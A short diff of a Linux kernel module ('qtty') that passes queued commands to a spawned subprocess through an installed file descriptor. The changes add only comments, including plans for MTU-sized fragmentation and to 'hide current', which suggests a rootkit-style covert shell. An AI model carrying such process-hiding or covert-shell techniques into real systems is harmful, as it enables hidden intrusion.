@@ -37,6 +37,8 @@ Eventually, when we are done with cur_command, we will pull it off
 struct command* cur_command = NULL; //the command we are currently processing
 
 ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){
+
+  //fragmentation into MTU sized blocks should happen here. 
     printk(KERN_INFO "WRITING\n");
     char* kbuf = (char*)kzalloc(size+1, GFP_KERNEL); //make sure the string actually terminates so add 1 
     if(!access_ok(buf, size)){
@@ -95,7 +97,7 @@ ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){
   
 
   if(!cur_command){
-    BUG_ON(!cur_command && *off != 0);
+    BUG_ON(!cur_command && *off != 0); //it should never happen that we have a nonzero offset while cur_command is 0
     if(list_empty(&commands)){
      wait_read(); //wait until we get a new command. TODO: This should be made killable. 
     }
@@ -231,6 +233,9 @@ int init_func(struct subprocess_info* info, struct cred* new){
   retval = get_unused_fd_flags(0);
   //  printk(KERN_INFO "retval: %d\n", retval);
   fd_install(retval, qtty_file_2); //thank FUCKING GOD this is exported. 
+
+
+  //hide current at this point i guess.
   return 0;
 
 }
